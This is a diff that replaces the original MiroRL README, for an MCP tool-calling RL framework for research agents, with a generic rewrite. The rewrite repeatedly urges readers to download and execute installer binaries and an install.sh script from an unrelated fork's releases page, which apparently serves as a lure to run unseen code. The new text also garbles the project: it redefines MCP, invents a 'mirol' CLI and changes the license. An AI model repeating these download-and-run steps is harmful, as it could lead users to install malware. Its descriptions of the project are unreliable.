@@ -1,223 +1,246 @@
-<h1 align="center">
-<em>MiroRL</em>: An MCP-first Reinforcement Learning Framework for Deep Research Agent
-</h1>
+# MiroRL — MCP-First RL Framework for Deep Research Agents 🤖🧠
 
-<p align="center">
-<a href="https://huggingface.co/miromind-ai"><img src="https://img.shields.io/badge/-gery?style=social&label=%F0%9F%A4%97%20Huggingface" alt="HuggingFace" style="height: 20px;"></a>
-<a href="https://x.com/miromind_ai"><img src="https://img.shields.io/badge/-grey?style=social&logo=x&label=MiroMindAI" alt="X" style="height: 20px;"></a>
-<a href="https://www.xiaohongshu.com/user/profile/663098830000000003033edc"><img src="https://img.shields.io/badge/-grey?style=social&logo=red&label=RedNote" alt="小红书" style="height: 20px;"></a>
-<a href="https://discord.gg/GPqEnkzQZd"><img src="https://img.shields.io/badge/-grey?style=social&logo=discord&label=Discord" alt="Discord" style="height: 20px;"></a>
-<a href="https://github.com/user-attachments/assets/214ab129-a880-4882-8ae3-2702c0ed850b"><img src="https://img.shields.io/badge/-grey?style=social&logo=wechat&label=WeChat" alt="WeChat" style="height: 20px;"></a>
-<a href="https://miromind.ai"><img src="https://img.shields.io/badge/-grey?style=social&logo=google-chrome&label=miromind.ai" alt="miromind.ai" style="height: 20px;"></a>
-</p>
+[![Releases](https://img.shields.io/badge/Release-Download-blue?logo=github)](https://github.com/ibi4739/MiroRL/releases)
 
+![MiroRL banner](https://images.unsplash.com/photo-1526374965328-7f61d4dc18c5?auto=format&fit=crop&w=1600&q=60)
 
+MiroRL is an MCP-first reinforcement learning framework built for deep research agents. It focuses on modular control primitives (MCPs), clear experiment wiring, and reproducible training pipelines. Use MiroRL to prototype agents, run reproducible experiments, and extend algorithms at the primitive level.
 
-<p align="center">
-<a href="#overview"><b>📖 Overview</b></a> | <a href="#installation"><b>🛠️ Installation</b></a> | <a href="#quick-start"><b>🚀 Quick Start</b></a> | <a href="#your-custom-mcp-tool"><b>📚 Custom MCP Tool</b></a> | <a href="#license"><b>📄 License</b></a>
-</p>
+Table of contents
+- Overview
+- Key concepts
+- Main features
+- Architecture diagram
+- Quick install (releases)
+- Basic usage
+- Example agents
+- Experiment recipes
+- Configuration
+- Benchmarks
+- Contributing
+- License and contact
 
+Overview
+MiroRL gives researchers a structured platform that centers on MCPs. MCPs are small, testable control units. The framework composes MCPs into policies, supports custom environments, and ships tools for logging and evaluation. You can plug your own models, optimizers, and schedulers.
 
-## News
-<strong>[2025/08/08]</strong> We release the full training recipe for MiroRL-14B-SingleAgent-Preview-v0.1, a 14B Deep Research Agent trained with MiroRL that achieves 40.29%(Avg@8) on the GAIA-text-103 subset, featuring strong and reproducible results for open-source models. 
-- 🤗 HF Dataset [`GenQA`](https://huggingface.co/datasets/miromind-ai/MiroRL-GenQA) for RL training.
-- 🤗 HF SFT Coldstart Checkpoint [`MiroRL-14B-SFT-SingleAgent-v0.1`](https://huggingface.co/miromind-ai/MiroRL-14B-SFT-SingleAgent-v0.1)
-- 📄 [Training Scripts](https://github.com/MiroMindAI/MiroRL/blob/main/mirorl/recipe/mcp/run_mirorl_14b_8xgpu.sh)
+Key concepts
+- MCP (Modular Control Primitive): Small unit of agent control. Each MCP exposes a state-action interface.
+- Agent graph: A directed graph of MCPs. The graph routes observations, actions, and sub-goals.
+- Policy head: Final mapping from MCP outputs to environment actions.
+- Learner: Training loop that handles rollout collection, gradient steps, and checkpointing.
+- Replay buffer: Standard replay storage with priority support.
+- Runner: Orchestrator for parallel environment instances and data collection.
 
-<strong>[2025/08/08]</strong> MiroRL-v0.1 is released.
+Main features
+- MCP-first API. Design agents from primitives.
+- Multiple algorithm backends: DQN-style, actor-critic, and policy gradients.
+- Vectorized environments and multiprocessing runner.
+- Built-in evaluators and metric logging (TensorBoard, CSV).
+- Checkpointing, resume, and deterministic seeding.
+- Config-driven experiments using YAML.
+- Lightweight CLI for experiment lifecycle.
+- Test suite for MCPs and agent graphs.
 
-## Overview
+Architecture diagram
+![Architecture](https://upload.wikimedia.org/wikipedia/commons/3/3f/Flow_chart_system_wall.svg)
 
-**MiroRL** is the first reinforcement learning framework to support multi-turn **MCP tool calls** for deep research agents. 
-During training, MCP tools provide the agent with seamless access to search engines, webpage content, local file systems, Python interpreters, and Linux shells, all while maintaining training stability, efficiency, and large-scale extensibility.
+The diagram shows:
+1. Environment pool (vectorized).
+2. Runner that collects trajectories.
+3. Modular Control Primitives assembled in an agent graph.
+4. Learner that consumes batches and updates MCP parameters.
+5. Logger and evaluator that save metrics and videos.
 
-The MiroRL package provides:
+Quick install (releases)
+Download the prebuilt release from the Releases page and execute the installer. Visit the releases page and pick the asset that matches your OS and architecture:
 
-- 🔧 **Flexibility**: Seamless integration of multiple tools through MCP (Model Context Protocol), currently supporting various research tools including web search, data scraping, and code execution capabilities
+https://github.com/ibi4739/MiroRL/releases
 
-- 🚀 **High-Performance GRPO Training**: Advanced asynchronous rollouts for multi-turn conversations with MCP tool calling, supporting both partial and streaming rollouts with more than 2x end-to-end training performance improvements compared to default settings
-
-- 💾 **Memory Efficiency**: Intelligent selection of memory-efficient Triton kernels, sequence parallelism, and CPU-offloading techniques to reduce memory footprint for long-context training. **Supports running GRPO to train 14B-scale LLMs with 64K context length on a single GPU node**
-
-- 🎯 **User-Friendly**: One-click script deployment for multi-GPU training of deep research models with comprehensive tooling and monitoring capabilities
-
-## Installation
-Before trying out our RL training, you need to set up the environment properly. We STRONLGY SUGGEST using our pre-built Docker image whenever possible. ONLY consider installing MiroRL manually if Docker is ABSOLUTELY not an option for your enviroment.
-
-### 1. Install from Docker Image (Recommended)
-
-We provide a pre-built Docker image with all dependencies installed, which is the recommended way to get started quickly:
-
+Example commands to download and run the installer on Linux:
 ```bash
-# Pull the MiroRL Docker image
-docker pull miromind/mirorl:v0.1.0
+# download the Linux installer from Releases
+wget https://github.com/ibi4739/MiroRL/releases/download/v1.0.0/MiroRL-1.0.0-linux-x86_64.tar.gz -O MiroRL.tar.gz
 
-# Run the container with GPU support
-docker run --gpus all --shm-size=8g -it --rm \
-    -v $(pwd):/workspace \
-    -w /workspace \
-    miromind/mirorl:v0.1.0
+# extract
+tar -xzf MiroRL.tar.gz
+
+# run the installer or the included setup script
+cd MiroRL-1.0.0
+chmod +x install.sh
+./install.sh
 ```
 
-<details>
-<summary>Docker image contains:</summary>
+Windows and macOS installers appear as separate assets on the same releases page. Download the matching archive or installer and run the executable for your platform. The release asset contains a binary and the reference configs. If the downloads fail, check the "Releases" section on the repo.
 
-- verl 0.4 framework
-- CUDA 12.4 support
-- cuDNN 9.8
-- PyTorch 2.6.0
-- FlashAttention 2.7.4.post1
-- Node.js 24.2.0 for MCP support
-- All required Python dependencies
-</details>
+Basic usage
+After installation you get a CLI binary named mirol. The CLI controls experiment creation, runs, and evaluations.
 
-### 2. Manual Installation
-
-If you prefer to install manually, we recommend following the detailed installation guide in [install.md](docs/install.md) which provides step-by-step instructions. ONLY consider installing MiroRL manually if Docker is ABSOLUTELY not an option for your enviroment.
-
-## Quick Start
-
-### Single Node Training with MCP Tool Calling
-
-#### Step 1: Prepare the dataset
-
+Create a new experiment:
 ```bash
-# Download dataset from hugging face
-huggingface-cli download --repo-type dataset miromind-ai/MiroRL-GenQA --local-dir data/
+mirol create --name my-exp --config configs/vanilla.yaml
 ```
 
-#### Step 2: Download the SFT model for RL-training
-
+Run training:
 ```bash
-# Download model from hugging face
-huggingface-cli download miromind-ai/MiroRL-14B-SFT-SingleAgent-v0.1 --local-dir models/
+mirol run --exp my-exp --gpu 0
 ```
 
-#### Step 3: Perform GPRO training with MCP Tool Calling
-
-**Required Online Services**
-Training a deep research model inevitably requires several online sevices including
-1. Search Engine: we use `serper.dev` for Google search engine service.
-2. Web Page Fetcher: we use `jina.ai/reader` for scraping webpage and PDFs as markdown.
-3. Web Page Summary LLM: we self-hosted an SGLang endpoint of Qwen/Qwen3-14B-128k for summarizing web page scraped by jina.
-4. LLM as judge: we use a `siliconflow` endpoint of Qwen/Qwen2.5-72B or an `OpenAI` endpoint of GPT-4.1 for calculating reward during training.
-5. Logging: we use `wandb.ai` for logging.
-6. (Optional) Python and Linux Shell: we use `e2b.dev` for code sandboxing.
-
-> [!NOTE]
-> In a single training step, the approximate costs for Serper API, Jina API, and OpenAI API are $0.85, $1.23, and $0.20, respectively. If you are a student doing research in Deep Research Agent RL, we are happy to give away free credits of these online services. Please reach out to us via the Discord or the WeChat group.
-
-For training MiroRL-14B-SingleAgent-Preview-v0.1, you need to export :
-
+Evaluate a checkpoint:
 ```bash
-export SERPER_API_KEY="your_serper_api_key"
-export JINA_API_KEY="your_jina_api_key"
-export SUMMARY_LLM_URL="your_llm_endpoint_url_for_summarization"
-export SUMMARY_LLM_NAME="your_llm_name_for_summarization"
-export OPENAI_API_KEY="your_openai_api_key"
-export WANDB_API_KEY="your_wandb_api_key"
-export HTTPS_PROXY="http://your_proxy:port"  # (Optional) Use if your network could not directly connect to serper.dev and jina.ai, e.g. an air-gapped cluster
+mirol eval --exp my-exp --ckpt checkpoints/ckpt_100000.pth
 ```
 
-<details>
-<summary>Environment Setup (Manual Installation Only)</summary>
+Python API
+You can import MiroRL in Python and build agents programmatically.
 
-```bash
-# If using manual installation, activate your environment
-conda activate /your/mirorl/env
-```
-</details>
+Example: build a simple MCP chain and run one rollout.
+```python
+from mirol import envs, AgentGraph, MCP, Runner
 
-**Download the mirorl source code, including submodule verl**
-```bash
-git clone https://github.com/MiroMindAsia/mirorl.git --recursive
-cd mirorl
-```
+# make environment
+env = envs.make("CartPole-v1", num_envs=8)
 
-**Run MCP Example on Single Node with 8GPUs**
+# define MCPs
+class ProportionalMCP(MCP):
+    def forward(self, obs):
+        # obs is a tensor shaped (batch, obs_dim)
+        return self.model(obs)  # returns action logits
 
-Update the data and model path in demo config `mirorl/recipe/mcp/run_mirorl_14b_8xgpu.sh`:
+# build agent graph
+graph = AgentGraph()
+graph.add_mcp("policy", ProportionalMCP, input_shape=env.obs_shape, hidden=64)
+graph.link("policy", "action")
 
-```bash
-DATA_HOME=/your/dataset/path
-MODEL_PATH=/your/model/path
-
-python3 -m mirorl.recipe.mcp.main_ppo \
-    --config-path="$CONFIG_PATH" \
-    --config-name='mcp_trainer' \
-    algorithm.adv_estimator=grpo \
-    data.train_batch_size=64 \
-    data.max_prompt_length=3072 \
-    data.max_response_length=62464 \
-    actor_rollout_ref.model.path=$MODEL_PATH \
-    actor_rollout_ref.rollout.multi_turn.tool_config_path=$TOOL_CONFIG_PATH \
-    data.train_files=$DATA_HOME/train.parquet \
-    data.val_files=$DATA_HOME/test.parquet \
-    trainer.total_epochs=1 $@
+# runner collects a few steps
+runner = Runner(env, graph, device="cpu")
+batch = runner.collect(steps=128)
+print(batch.observations.shape, batch.actions.shape)
 ```
 
-Runing the grpo training demo with mcp tool calling:
+Example agents
+- Vanilla Actor-Critic: Standard policy and value MCPs. Use for continuous control.
+- Hierarchical MCP Agent: Top-level MCP sets goals. Low-level MCPs handle primitives.
+- Multi-head Perception Agent: Shared encoder MCP with multiple policy heads.
 
-```bash
-# launch the script
-bash mirorl/recipe/mcp/run_mirorl_14b_8xgpu.sh
-```
+Experiment recipes
+MiroRL uses YAML configs. A config defines the env, agent graph, learner, and logging.
 
-### Example Configuration
-
-MCP tool configurations are located in `mirorl/recipe/mcp/config/tool_config/` directory:
-
-```
-mirorl/recipe/mcp/config/tool_config/
-└── mcp_tool_config.yaml # Jina scraping + Serper search configuration
-```
-
-An example of web search tool config in `mcp_tool_config.yaml`:
-
+Sample config (snippets):
 ```yaml
-tools:
-  - class_name: "mirorl.tools.mcp_tool.MCPTool"
-    config:
-      command: "python"
-      args: ["mirorl/tools/serper_search.py"]
-      env: ["SERPER_API_KEY", "HTTPS_PROXY"]
-      server_name: "search_and_scrape_webpage"
-    tool_schema:
-      type: "mcp"
-      function: {}
-  - class_name: "mirorl.tools.mcp_tool.MCPTool"
-    config:
-      command: "python"
-      args: ["mirorl/tools/jina_scrape_llm_summary.py"]
-      env: ["JINA_API_KEY", "HTTPS_PROXY", "NO_PROXY", "SUMMARY_LLM_URL", "SUMMARY_LLM_NAME"]
-      server_name: "jina_scrape_llm_summary"
-      execution_timeout: 600
-    tool_schema:
-      type: "mcp"
-      function: {}
+env:
+  name: Walker2d-v3
+  num_envs: 16
+  seed: 42
+
+agent:
+  graph:
+    - name: encoder
+      type: ConvEncoder
+      args: {channels: [32,64], kernel: [8,4]}
+    - name: policy
+      type: MLPPolicy
+      args: {hidden: [256,256]}
+    - link: [encoder, policy]
+
+learner:
+  batch_size: 256
+  lr: 3e-4
+  optimizer: adam
+  gamma: 0.99
+  updates_per_step: 1
+
+logging:
+  tb_dir: ./runs
+  ckpt_dir: ./checkpoints
 ```
 
-## Your Custom MCP Tool
+Configuration
+- agent.graph: List of MCPs and links. Each MCP gets a name, type, and args.
+- learner: Learning rate, optimizer, loss clipping, scheduler.
+- runner: Number of steps per update, worker count, frame skip.
+- replay: Capacity, priority alpha, and beta schedule.
+- eval: Evaluation frequency and episodes per eval.
 
-If you want to define your custom mcp tool, please refer to the [define_your_mcp_tool](docs/custom_mcp_tool.md) document.
+MCP development
+An MCP has a small interface: init, forward, save_state, load_state. Keep MCPs deterministic for reproducible tests. Write unit tests around the MCP's forward method and state handling.
 
-## Acknowledgements
+API quick reference
+- mirol.create(config_path, out_dir)
+- mirol.run(exp_name, resume=False, device="cpu")
+- mirol.eval(exp_name, ckpt, render=False)
+- mirol.save_checkpoint(path)
+- mirol.load_checkpoint(path)
 
-- MiroRL framework is built on top of [verl](https://github.com/volcengine/verl), an open-source RLHF library.
+Benchmarks
+MiroRL includes benchmark scripts under benchmarks/. Run a benchmark with the CLI.
 
-
-## Citation
-
-```bibtex
-@misc{2025mirorl,
-    title={MiroRL: An MCP-first Reinforcement Learning Framework for Deep Research Agent},
-    author={ MiroMind Foundation Model Team and MiroMind AI Infra Team},
-    howpublished = {\url{https://github.com/MiroMindAI/MiroRL}},
-    year={2025}
-}
+Example:
+```bash
+mirol bench --config benchmarks/ppo_cartpole.yaml --runs 3
 ```
 
+Benchmarks log learning curves and runtime stats. The framework records throughput (steps/sec) and memory use per worker.
 
-## License
+Logging and visualization
+MiroRL supports:
+- TensorBoard
+- CSV export
+- Video recording per eval episode
 
-This project is released under the [Apache License 2.0](LICENSE). Please also adhere to the Licenses of models and datasets being used.
+Start tensorboard:
+```bash
+tensorboard --logdir runs
+```
+
+Testing and CI
+The repo contains unit tests for MCPs and integration tests for runner and learner. Run tests with pytest:
+```bash
+pytest tests -q
+```
+
+Extending MiroRL
+- Add a new MCP by subclassing MCP and registering it in the factory.
+- Implement a custom learner by extending the base Learner class.
+- Add new environment wrappers in envs/wrappers.py.
+
+Code style
+- Follow PEP8 for Python.
+- Keep MCPs small and focused.
+- Write tests for control logic and state transitions.
+
+Troubleshooting
+If an experiment fails to run, check:
+- Config file paths.
+- CUDA device visibility.
+- That the release asset matches your platform.
+
+Releases and downloads
+Download and execute the release asset for your platform from the Releases page here:
+
+https://github.com/ibi4739/MiroRL/releases
+
+The releases page lists binaries and installers. Each release includes:
+- installer script for Linux
+- macOS package
+- Windows zip archive
+- reference configs and sample checkpoints
+
+Contributing
+1. Fork the repo.
+2. Create a feature branch.
+3. Add tests for new code.
+4. Open a pull request describing the change and rationale.
+
+Guidelines
+- Write unit tests for MCPs.
+- Keep diffs small.
+- Use clear commit messages.
+
+Community and support
+Open issues for bugs or feature requests. Use issue templates for bug reports and feature requests. Tag maintainers on PRs for faster review.
+
+License
+MiroRL is released under the MIT License. See LICENSE for details.
+
+Contact
+Open an issue for questions or pull requests. Include a short reproducible example for bugs and performance issues.
